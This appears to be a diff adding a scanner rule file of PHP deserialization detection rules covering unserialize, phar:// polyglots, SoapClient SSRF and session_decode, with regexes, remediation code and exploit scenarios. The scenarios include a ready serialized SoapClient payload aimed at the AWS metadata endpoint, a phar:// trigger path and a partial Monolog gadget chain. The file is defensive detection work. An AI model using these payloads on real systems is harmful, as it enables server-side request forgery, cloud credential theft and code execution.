@@ -1,0 +1,1591 @@
+rules:
+  # ============================================================================
+  # DESER-PHP-001: unserialize with User Input
+  # ============================================================================
+  - rule_id: "DESER-PHP-001"
+    title: "PHP unserialize on User-Controlled Input Leading to Object Injection"
+    description: >
+      Detects usage of PHP's unserialize() function on data originating from
+      user-controlled sources such as request parameters, cookies, headers,
+      or external input. PHP object injection via unserialize is one of the
+      most critical vulnerability classes in PHP applications. When untrusted
+      data is passed to unserialize(), an attacker can instantiate arbitrary
+      PHP objects whose __wakeup(), __destruct(), __toString(), or other
+      magic methods execute during or after deserialization. Combined with
+      gadget chains in the application or its frameworks, this leads to
+      remote code execution, file operations, or SQL injection.
+    language: php
+    category: deserialization
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - unserialize
+      - rce
+      - object-injection
+      - critical
+      - magic-methods
+    detection_layer: 1
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES|SESSION)\s*\['
+        description: "unserialize on PHP superglobal array element"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$(data|input|payload|body|content|value|param|raw|user_input)'
+        description: "unserialize on common user-controlled variable names"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*base64_decode\s*\('
+        description: "unserialize on base64-decoded data"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*file_get_contents\s*\(\s*\$'
+        description: "unserialize on file contents with user-controlled path"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$request->(input|get|post|cookie|header)\s*\('
+        description: "unserialize on Laravel/framework request method"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*(gzuncompress|gzinflate|bzdecompress)\s*\('
+        description: "unserialize on decompressed data"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*hex2bin\s*\('
+        description: "unserialize on hex-decoded data"
+      - type: regex
+        pattern: 'unserialize\s*\(\s*\$_SERVER\s*\[\s*["\x27]HTTP_'
+        description: "unserialize on HTTP header value from SERVER superglobal"
+    anti_patterns:
+      - 'unserialize\s*\(\s*serialize\s*\('
+      - 'unserialize\s*\(\s*["\x27](a:|s:|i:|b:|O:0:)'
+      - 'unserialize\s*\([^)]*\[\s*["\x27]allowed_classes["\x27]\s*=>\s*(false|\[\s*\]|\[.*\\\\)'
+      - 'unserialize\s*\(\s*\$this->'
+      - 'unserialize\s*\(\s*\$config'
+      - 'unserialize\s*\(\s*file_get_contents\s*\(\s*["\x27]'
+      - '\/\/\s*@nosec'
+      - '\/\/\s*test'
+      - 'unserialize\s*\(\s*\$internal'
+      - 'unserialize\s*\(\s*\$trusted'
+      - 'unserialize\s*\(\s*\$cache'
+      - 'hash_hmac.*unserialize|unserialize.*hash_hmac'
+      - 'unserialize\s*\(\s*\$fixture'
+      - 'unserialize\s*\(\s*\$mock'
+      - 'unserialize\s*\(\s*\$default'
+    bypass_variants:
+      - description: "Using allowed_classes with overly permissive list"
+        pattern: 'unserialize\s*\([^)]*allowed_classes["\x27]\s*=>\s*true'
+      - description: "Indirect unserialize via variable function call"
+        pattern: '\$func\s*=\s*["\x27]unserialize["\x27]\s*;\s*\$func\s*\('
+      - description: "unserialize through call_user_func"
+        pattern: 'call_user_func\s*\(\s*["\x27]unserialize["\x27]'
+    evasion_indicators:
+      - "Variable function call to hide unserialize"
+      - "call_user_func or call_user_func_array with unserialize"
+      - "Base64 or hex-encoded serialized payload"
+      - "Compressed serialized data (gzip/bzip2)"
+      - "Serialized data in cookie or hidden form field"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'unserialize\s*\(\s*base64_decode\s*\(\s*\$(data|input|payload|cookie)'
+      - type: "hex"
+        pattern: 'unserialize\s*\(\s*hex2bin\s*\(\s*\$'
+      - type: "gzip"
+        pattern: 'unserialize\s*\(\s*gzuncompress\s*\(\s*\$'
+    multi_function_chain_patterns:
+      - "Cookie value -> base64_decode -> unserialize -> __wakeup -> code execution"
+      - "POST parameter -> unserialize -> __destruct -> file write -> webshell"
+      - "Session data -> unserialize -> __toString -> SQL injection"
+      - "Hidden form field -> base64_decode -> unserialize -> __call -> RCE"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "PHP object injection through unserialize triggers magic methods (__wakeup, __destruct, __toString) that can chain to RCE through framework gadget chains"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "$_GET / $_POST / $_COOKIE / $_REQUEST"
+        sink: "unserialize()"
+        through: "Direct or base64-decoded parameter"
+      - source: "HTTP request body"
+        sink: "unserialize()"
+        through: "Framework input method"
+      - source: "File upload content"
+        sink: "unserialize()"
+        through: "file_get_contents()"
+    impact: |
+      PHP unserialize object injection can lead to:
+      - Remote Code Execution through magic method gadget chains
+      - Arbitrary file read/write via __destruct or __wakeup
+      - SQL injection through __toString and database operations
+      - Server-Side Request Forgery via object property manipulation
+      - Authentication bypass through session manipulation
+      - Denial of Service through resource-intensive object construction
+    remediation: |
+      1. Never pass user input to unserialize. Use json_decode instead:
+         ```php
+         // Bad: unserialize on user input
+         $data = unserialize($_POST['data']);
+
+         // Good: use JSON
+         $data = json_decode($_POST['data'], true);
+         ```
+      2. If unserialize is required, use allowed_classes restriction (PHP 7.0+):
+         ```php
+         $data = unserialize($input, ['allowed_classes' => false]);
+         // Or whitelist specific classes:
+         $data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
+         ```
+      3. Sign serialized data with HMAC before storing and verify before loading:
+         ```php
+         // Signing
+         $signed = hash_hmac('sha256', $serialized, $secret) . '|' . $serialized;
+         // Verification
+         [$hash, $data] = explode('|', $signed, 2);
+         if (!hash_equals(hash_hmac('sha256', $data, $secret), $hash)) {
+             throw new Exception('Invalid signature');
+         }
+         ```
+      4. Use typed serialization libraries like Symfony Serializer with normalization.
+      5. Implement Content Security Policy and input validation.
+    references:
+      - "https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://www.php.net/manual/en/function.unserialize.php"
+    context_awareness:
+      surrounding_context_patterns:
+        - "unserialize call on variable populated from user input"
+        - "No allowed_classes parameter in unserialize call"
+        - "No HMAC verification before unserialize"
+        - "User input flows through decode functions to unserialize"
+      taint_source_indicators:
+        - "$_GET"
+        - "$_POST"
+        - "$_COOKIE"
+        - "$_REQUEST"
+        - "$_SERVER['HTTP_*']"
+        - "$request->input()"
+      taint_sink_indicators:
+        - "unserialize()"
+        - "call_user_func('unserialize')"
+        - "call_user_func_array('unserialize')"
+      sanitization_patterns:
+        - "allowed_classes => false"
+        - "allowed_classes => [specific classes]"
+        - "HMAC verification before unserialize"
+        - "json_decode instead of unserialize"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 - allowed_classes_present)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A PHP application stores user preferences in a cookie using
+        base64_encode(serialize($prefs)). The application retrieves
+        preferences with unserialize(base64_decode($_COOKIE['prefs'])).
+        An attacker crafts a serialized PHP object exploiting a gadget
+        chain in the Monolog library:
+        O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"\0*\0socket";
+        O:29:"Monolog\Handler\BufferHandler":7:...}
+        This chains through __destruct -> write -> exec, achieving RCE.
+      example_payload: 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\\Handler\\BufferHandler":7:{...exec_payload...}}'
+      attacker_objective: "Achieve remote code execution through PHP object injection by crafting serialized objects that trigger gadget chains via magic methods"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-002"
+        - "DESER-PHP-003"
+        - "DESER-PHP-005"
+        - "DESER-PHP-008"
+
+  # ============================================================================
+  # DESER-PHP-002: phar:// Deserialization (Phar Polyglot)
+  # ============================================================================
+  - rule_id: "DESER-PHP-002"
+    title: "Phar Stream Wrapper Deserialization via phar:// Polyglot Files"
+    description: >
+      Detects code paths where file operation functions (file_exists,
+      is_file, fopen, file_get_contents, etc.) can be called with a
+      user-controlled path that could include the phar:// stream wrapper.
+      When PHP processes a phar:// URL, it automatically deserializes the
+      phar archive's metadata using unserialize, regardless of what file
+      function is called. An attacker can upload a polyglot file (a file
+      that is simultaneously a valid image and a valid phar archive) and
+      then trigger metadata deserialization by making any file function
+      access it via phar://. This bypasses file upload filters and provides
+      a powerful deserialization primitive.
+    language: php
+    category: deserialization
+    severity: Critical
+    confidence: 0.91
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - phar
+      - polyglot
+      - file-operation
+      - stream-wrapper
+      - rce
+      - critical
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: '(file_exists|is_file|is_dir|is_link|file_get_contents|fopen|readfile|include|require)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'
+        description: "File operation with user-controlled path from superglobal"
+      - type: regex
+        pattern: '(file_exists|is_file|is_dir|file_get_contents|fopen|stat|lstat|filetype)\s*\(\s*\$(path|file|filename|url|uri|input|param)'
+        description: "File operation with user-controlled variable"
+      - type: regex
+        pattern: '(getimagesize|exif_read_data|imagecreatefrom\w+)\s*\(\s*\$(path|file|filename|url|upload)'
+        description: "Image processing function with user-controlled path"
+      - type: regex
+        pattern: '(copy|rename|unlink)\s*\(\s*\$(path|file|filename|source|src)'
+        description: "File manipulation function with user-controlled path"
+      - type: regex
+        pattern: '(simplexml_load_file|DOMDocument.*load)\s*\(\s*\$(path|file|filename|url)'
+        description: "XML loading function with user-controlled path"
+      - type: regex
+        pattern: 'new\s+SplFileInfo\s*\(\s*\$(path|file|filename)'
+        description: "SplFileInfo creation with user-controlled path"
+      - type: regex
+        pattern: 'md5_file\s*\(\s*\$(path|file|filename|upload)'
+        description: "md5_file with user-controlled path enabling phar deserialization"
+      - type: regex
+        pattern: 'sha1_file\s*\(\s*\$(path|file|filename|upload)'
+        description: "sha1_file with user-controlled path enabling phar deserialization"
+    anti_patterns:
+      - 'phar\.readonly\s*=\s*On|phar\.readonly\s*=\s*1'
+      - 'stream_wrapper_unregister\s*\(\s*["\x27]phar["\x27]\s*\)'
+      - 'basename\s*\(\s*\$.*\)\s*\).*file_(exists|get_contents)'
+      - 'realpath\s*\(.*phar'
+      - 'preg_match\s*\(\s*["\x27].*phar.*["\x27]\s*,\s*\$'
+      - 'strpos\s*\(\s*\$\w+\s*,\s*["\x27]phar["\x27]\s*\)'
+      - 'str_starts_with\s*\(\s*\$\w+\s*,\s*["\x27]phar["\x27]\s*\)'
+      - '\/\/\s*test'
+      - 'mock.*file'
+      - 'file_exists\s*\(\s*["\x27]/'
+      - 'file_exists\s*\(\s*__DIR__'
+      - 'file_exists\s*\(\s*dirname'
+      - 'file_exists\s*\(\s*\$this->'
+      - 'UPLOADS_DIR.*file_exists'
+    bypass_variants:
+      - description: "Polyglot JPEG-PHAR file bypassing image validation"
+        pattern: '(getimagesize|imagecreatefrom\w+|exif_read_data).*\$.*upload'
+      - description: "Path manipulation to inject phar:// wrapper"
+        pattern: 'phar://|PHAR://|Phar://'
+      - description: "Using compress.zlib wrapper to bypass phar:// filtering"
+        pattern: 'compress\.(zlib|bzip2)://phar://'
+    evasion_indicators:
+      - "File upload followed by file operation with controllable path"
+      - "Polyglot file (JPEG/GIF header + phar archive data)"
+      - "URL path manipulation to inject phar:// stream wrapper"
+      - "compress.zlib://phar:// or compress.bzip2://phar:// wrapper chain"
+      - "Phar archive with crafted metadata containing gadget chains"
+    encoding_variants:
+      - type: "compress_zlib"
+        pattern: 'compress\.zlib://phar://'
+      - type: "compress_bzip2"
+        pattern: 'compress\.bzip2://phar://'
+      - type: "uppercase_bypass"
+        pattern: '[Pp][Hh][Aa][Rr]://'
+    multi_function_chain_patterns:
+      - "File upload -> store on disk -> file_exists with phar:// -> metadata deserialization -> RCE"
+      - "Image upload -> getimagesize validation -> phar:// access -> __wakeup gadget"
+      - "Path traversal -> phar:// injection in file_get_contents -> deserialization"
+      - "Avatar upload -> polyglot JPEG-PHAR -> thumbnail generation -> phar deserialization"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Any file operation function with user-controlled path can trigger phar metadata deserialization, converting file access into object injection"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "File upload + path parameter"
+        sink: "file_exists / file_get_contents / getimagesize"
+        through: "phar:// stream wrapper triggering metadata deserialization"
+      - source: "$_GET['path'] / $_POST['file']"
+        sink: "Any file operation function"
+        through: "phar:// wrapper injection in path"
+      - source: "User avatar upload"
+        sink: "Image processing function"
+        through: "Polyglot JPEG-PHAR file"
+    impact: |
+      Phar deserialization exploitation can lead to:
+      - Remote Code Execution through PHP object injection via phar metadata
+      - File upload filter bypass through polyglot file techniques
+      - Bypasses read-only operations (even file_exists triggers deserialization)
+      - Server compromise via framework gadget chains
+      - Escalation from file read vulnerability to full RCE
+    remediation: |
+      1. Disable phar stream wrapper if not needed:
+         ```php
+         // In php.ini
+         phar.readonly = On
+         // Or at runtime
+         stream_wrapper_unregister('phar');
+         ```
+      2. Validate and sanitize file paths before use:
+         ```php
+         function safePath($path) {
+             $path = realpath($path);
+             if ($path === false || !str_starts_with($path, '/var/www/uploads/')) {
+                 throw new \InvalidArgumentException('Invalid path');
+             }
+             if (stripos($path, 'phar://') !== false) {
+                 throw new \InvalidArgumentException('Phar wrapper not allowed');
+             }
+             return $path;
+         }
+         ```
+      3. Filter out phar:// and other dangerous stream wrappers from user input.
+      4. Use pathinfo() and basename() to restrict path components.
+      5. Validate uploaded files using content-based detection, not extension.
+    references:
+      - "https://blog.sonarsource.com/new-php-exploitation-technique"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf"
+    context_awareness:
+      surrounding_context_patterns:
+        - "File operation with user-controlled path variable"
+        - "No phar:// wrapper filtering on path"
+        - "File upload functionality in same application"
+        - "No stream_wrapper_unregister for phar"
+      taint_source_indicators:
+        - "$_GET['path']"
+        - "$_POST['file']"
+        - "$_FILES"
+        - "$request->file()"
+        - "User-controlled URL parameter"
+      taint_sink_indicators:
+        - "file_exists()"
+        - "file_get_contents()"
+        - "fopen()"
+        - "getimagesize()"
+        - "is_file()"
+        - "stat()"
+      sanitization_patterns:
+        - "stream_wrapper_unregister('phar')"
+        - "stripos check for 'phar://'"
+        - "realpath() canonicalization"
+        - "basename() path restriction"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (file_upload_present ? 1.4 : 0.8)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A PHP application allows users to upload profile images. The upload
+        handler validates the file is a valid JPEG using getimagesize().
+        The application also has a feature to check file existence using
+        file_exists() with a path constructed from user input. An attacker
+        creates a polyglot file that is simultaneously a valid JPEG and a
+        phar archive with serialized metadata containing a Monolog gadget
+        chain. The attacker uploads this as their avatar, then makes a
+        request with path=phar:///var/www/uploads/avatar.jpg. The
+        file_exists call triggers phar metadata deserialization, executing
+        the gadget chain for RCE.
+      example_payload: "phar:///var/www/uploads/polyglot_avatar.jpg/anything"
+      attacker_objective: "Trigger PHP object injection through phar metadata deserialization by manipulating file paths to use the phar:// stream wrapper"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-008"
+
+  # ============================================================================
+  # DESER-PHP-003: SoapClient SSRF via Deserialization
+  # ============================================================================
+  - rule_id: "DESER-PHP-003"
+    title: "SoapClient SSRF via PHP Object Deserialization"
+    description: >
+      Detects patterns where PHP's SoapClient class can be instantiated
+      through deserialization to perform Server-Side Request Forgery (SSRF).
+      When a serialized SoapClient object with a controlled _soap_url or
+      location property is deserialized, calling any method on the resulting
+      object (or triggering __call) causes SoapClient to make an HTTP
+      request to the attacker-specified URL. This is a well-known PHP
+      deserialization gadget that converts object injection into SSRF,
+      enabling internal network scanning, metadata endpoint access in
+      cloud environments, and potentially remote code execution through
+      SSRF-to-RCE chains.
+    language: php
+    category: deserialization
+    severity: High
+    confidence: 0.88
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - soapclient
+      - ssrf
+      - gadget
+      - internal-network
+      - cloud
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'new\s+SoapClient\s*\(\s*null\s*,\s*\[\s*["\x27]location["\x27]\s*=>\s*\$(url|uri|host|endpoint|target)'
+        description: "SoapClient with user-controlled location parameter"
+      - type: regex
+        pattern: 'new\s+SoapClient\s*\(\s*\$(url|uri|wsdl|endpoint|param|input)'
+        description: "SoapClient with user-controlled WSDL URL"
+      - type: regex
+        pattern: 'O:\d+:"SoapClient"'
+        description: "Serialized SoapClient object in data"
+      - type: regex
+        pattern: 'unserialize.*SoapClient|SoapClient.*unserialize'
+        description: "SoapClient referenced near unserialize operations"
+      - type: regex
+        pattern: 'SoapClient\s*\(\s*null\s*,\s*\[.*uri.*location'
+        description: "SoapClient with both uri and location parameters"
+      - type: regex
+        pattern: '__call\s*\(.*SoapClient'
+        description: "Magic __call method interaction with SoapClient"
+    anti_patterns:
+      - 'new\s+SoapClient\s*\(\s*["\x27]https?://[a-z0-9.-]+\.[a-z]'
+      - 'SoapClient\s*\(\s*["\x27][a-zA-Z].*\.wsdl["\x27]'
+      - '\/\/\s*test'
+      - 'mock.*SoapClient'
+      - 'SoapClient.*internal'
+      - 'SoapClient.*hardcoded'
+      - 'SoapClient.*config\['
+      - 'SOAP_WSDL_CACHE'
+      - 'SoapClient\s*\(\s*["\x27]file://'
+      - 'SoapClient.*\.env'
+      - 'SoapClient.*SOAP_1_2'
+      - 'SoapClient.*validated'
+      - 'SoapClient.*sanitized'
+    bypass_variants:
+      - description: "SoapClient SSRF via __call magic method triggering HTTP request"
+        pattern: 'O:\d+:"SoapClient":\d+:\{.*location.*http'
+      - description: "SoapClient targeting cloud metadata endpoint"
+        pattern: 'SoapClient.*169\.254\.169\.254|SoapClient.*metadata'
+      - description: "SoapClient with CRLF injection in user_agent for response splitting"
+        pattern: 'SoapClient.*user_agent.*\$'
+    evasion_indicators:
+      - "Serialized SoapClient object in cookie or POST parameter"
+      - "SoapClient with location pointing to internal services"
+      - "CRLF injection via user_agent property for response manipulation"
+      - "SoapClient targeting cloud metadata endpoints"
+      - "Chained object injection: SoapClient as property of deserialized object"
+    encoding_variants:
+      - type: "base64_serialized"
+        pattern: 'base64_decode.*SoapClient|SoapClient.*base64'
+      - type: "url_encoded"
+        pattern: 'urldecode.*SoapClient|O%3A\d+%3A%22SoapClient'
+      - type: "hex_encoded"
+        pattern: 'hex2bin.*SoapClient'
+    multi_function_chain_patterns:
+      - "unserialize -> SoapClient.__call -> HTTP request to internal service"
+      - "Object injection -> SoapClient.__destruct -> SSRF to metadata endpoint"
+      - "Cookie deserialization -> SoapClient object -> __toString -> SSRF"
+      - "phar:// deserialization -> SoapClient gadget -> cloud SSRF -> credential theft"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "SoapClient SSRF can access cloud metadata endpoints (169.254.169.254) to steal IAM credentials, enabling full cloud infrastructure compromise"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Serialized data in cookie/POST"
+        sink: "unserialize() -> SoapClient instantiation"
+        through: "PHP deserialization"
+      - source: "User-controlled URL parameter"
+        sink: "new SoapClient()"
+        through: "Direct parameter passing"
+      - source: "Phar metadata"
+        sink: "SoapClient.__call()"
+        through: "Phar deserialization"
+    impact: |
+      SoapClient SSRF through deserialization can lead to:
+      - Internal network scanning and service discovery
+      - Cloud metadata endpoint access (AWS/GCP/Azure credential theft)
+      - Access to internal APIs and admin interfaces
+      - Remote code execution through SSRF-to-RCE chains
+      - Data exfiltration through DNS or HTTP-based out-of-band channels
+      - CRLF injection via user_agent leading to response manipulation
+    remediation: |
+      1. Never deserialize untrusted data (see DESER-PHP-001):
+         ```php
+         $data = json_decode($input, true);
+         ```
+      2. If unserialize is required, explicitly deny SoapClient:
+         ```php
+         $data = unserialize($input, ['allowed_classes' => false]);
+         ```
+      3. Restrict outbound network access from the web server.
+      4. Block access to cloud metadata endpoints:
+         ```
+         iptables -A OUTPUT -d 169.254.169.254 -j DROP
+         ```
+      5. Disable SOAP extension if not needed:
+         ```ini
+         ; php.ini
+         ; extension=soap  (comment out)
+         ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://www.ambionics.io/blog/php-generic-gadget-chains"
+      - "https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf"
+    context_awareness:
+      surrounding_context_patterns:
+        - "unserialize call in same file or related controller"
+        - "SoapClient instantiation with variable parameters"
+        - "No SSRF protection on outbound requests"
+        - "Cloud environment (AWS/GCP/Azure)"
+      taint_source_indicators:
+        - "Deserialized object from user input"
+        - "$_GET / $_POST / $_COOKIE"
+        - "phar:// metadata"
+        - "Session data"
+      taint_sink_indicators:
+        - "SoapClient->__call()"
+        - "SoapClient->__soapCall()"
+        - "Any method call on SoapClient"
+        - "SoapClient constructor"
+      sanitization_patterns:
+        - "allowed_classes => false"
+        - "URL validation on SoapClient location"
+        - "Egress firewall rules"
+        - "Cloud metadata endpoint blocking"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (cloud_environment ? 1.4 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A PHP application on AWS deserializes cookie data using unserialize()
+        without allowed_classes restriction. An attacker crafts a serialized
+        SoapClient object with location set to the AWS metadata endpoint:
+        O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";
+        s:43:"http://169.254.169.254/latest/meta-data/iam/";
+        s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}
+        When the application deserializes this and any code path triggers
+        a method call on the object, SoapClient makes an HTTP request to
+        the metadata endpoint, exfiltrating AWS IAM credentials.
+      example_payload: 'O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";s:62:"http://169.254.169.254/latest/meta-data/iam/security-credentials/";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}'
+      attacker_objective: "Exploit SoapClient SSRF through deserialization to access cloud metadata endpoints and steal IAM credentials"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PHP-001"
+        - "DESER-PHP-002"
+        - "DESER-PHP-008"
+
+  # ============================================================================
+  # DESER-PHP-004: session_decode with Untrusted Data
+  # ============================================================================
+  - rule_id: "DESER-PHP-004"
+    title: "session_decode with Untrusted Data Enabling Object Injection"
+    description: >
+      Detects usage of PHP's session_decode() function on untrusted data.
+      session_decode() parses a session-encoded string (using PHP's session
+      serialization format) and populates the $_SESSION superglobal. This
+      function uses PHP's internal session serializer which handles object
+      deserialization, meaning that crafted session data can instantiate
+      arbitrary PHP objects with attacker-controlled properties. If an
+      application calls session_decode on data from external sources,
+      it creates an object injection vulnerability similar to unserialize.
+    language: php
+    category: deserialization
+    severity: High
+    confidence: 0.88
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - php
+      - session
+      - object-injection
+      - session-decode
+      - critical
+    detection_layer: 2
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'session_decode\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)'
+        description: "session_decode on superglobal data"
+      - type: regex
+        pattern: 'session_decode\s*\(\s*\$(data|input|payload|body|content|session_data|raw)'
+        description: "session_decode on user-controlled variable"
+      - type: regex
+        pattern: 'session_decode\s*\(\s*base64_decode\s*\('
+        description: "session_decode on base64-decoded data"
+      - type: regex
+        pattern: 'session_decode\s*\(\s*file_get_contents\s*\(\s*\$'
+        description: "session_decode on file content with variable path"
+      - type: regex
+        pattern: 'session_decode\s*\(\s*hex2bin\s*\('
+        description: "session_decode on hex-decoded data"
+      - type: regex
+        pattern: 'session\.serialize_handler\s*=\s*php_serialize'
+        description: "PHP serialize session handler enabling injection via pipe character"
+    anti_patterns:
+      - 'session_decode\s*\(\s*session_encode\s*\('
+      - 'session_decode\s*\(\s*["\x27]'
+      - '\/\/\s*test'
+      - 'mock.*session'
+      - 'session_decode\s*\(\s*\$this->'
+      - 'session_decode\s*\(\s*\$internal'
+      - 'session_decode\s*\(\s*\$trusted'
+      - 'session_decode.*hmac|hmac.*session_decode'
+      - 'session_decode\s*\(\s*\$fixture'
+      - 'session_decode\s*\(\s*\$config'
+      - 'session_decode\s*\(\s*\$cached'
+    bypass_variants:
+      - description: "Session handler inconsistency between serialize and deserialize"
+        pattern: 'session\.serialize_handler.*php_serialize.*session_decode'
+      - description: "Session fixation combined with session_decode injection"
+        pattern: 'session_id\s*\(\s*\$.*session_decode'
+      - description: "Custom session save handler with deserialization"
+        pattern: 'session_set_save_handler\s*\(.*read.*unserialize'
+    evasion_indicators:
+      - "Session serialization handler mismatch (php vs php_serialize)"
+      - "Session data from external storage without validation"
+      - "Base64 or hex-encoded session payload"
+      - "Session fixation combined with crafted session data"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'session_decode\s*\(\s*base64_decode\s*\(\s*\$'
+      - type: "hex"
+        pattern: 'session_decode\s*\(\s*hex2bin\s*\(\s*\$'
+      - type: "url_decoded"
+        pattern: 'session_decode\s*\(\s*urldecode\s*\(\s*\$'
+    multi_function_chain_patterns:
+      - "Cookie value -> base64_decode -> session_decode -> $_SESSION pollution -> object injection"
+      - "Database stored session -> session_decode -> object instantiation"
+      - "Redis session data -> session_decode -> __wakeup trigger -> RCE"
+      - "Session import feature -> session_decode -> arbitrary object creation"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "session_decode populates $_SESSION with deserialized objects, which may include gadget chain objects that execute code when their magic methods are called"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request parameter / cookie"
+        sink: "session_decode()"
+        through: "Direct or decoded parameter"
+      - source: "External session storage (Redis/Memcached/DB)"
+        sink: "session_decode()"
+        through: "Session read from compromised store"
+      - source: "Session import/migration feature"
+        sink: "session_decode()"
+        through: "User-provided session data string"
+    impact: |
+      session_decode on untrusted data can lead to:
+      - PHP object injection via session deserialization
+      - Remote Code Execution through gadget chains in $_SESSION
+      - Session hijacking and privilege escalation
+      - Authentication bypass by injecting admin session data
+      - Cross-user data leakage through session pollution
+    remediation: |
+      1. Never use session_decode on untrusted data:
+         ```php
+         // Bad: session_decode on user input
+         session_decode($_POST['session_data']);
+
+         // Good: use json_decode for data import
+         $data = json_decode($_POST['session_data'], true);
+         if (is_array($data)) {
+             $_SESSION['imported'] = $data;
+         }
+         ```
+      2. Use consistent session.serialize_handler across application.
+      3. Implement session data validation in custom save handlers.
+      4. Sign session data with HMAC before storage.
+      5. Use PHP 7.0+ with allowed_classes for any deserialization.
+    references:
+      - "https://www.php.net/manual/en/function.session-decode.php"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "session_decode call with variable argument"
+        - "No HMAC verification before session_decode"
+        - "Session serializer handler configuration"
+        - "User input flowing into session_decode"
+      taint_source_indicators:
+        - "$_GET"
+        - "$_POST"
+        - "$_COOKIE"
+        - "Database query result"
+        - "Redis/Memcached get"
+      taint_sink_indicators:
+        - "session_decode()"
+        - "$_SESSION population"
+        - "session_set_save_handler read callback"
+      sanitization_patterns:
+        - "HMAC verification before decode"
+        - "JSON-based session data handling"
+        - "Input validation before session_decode"
+        - "Consistent serialize_handler"
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (external_session_source ? 1.3 : 0.8)"
+      exploitability_score: "High"
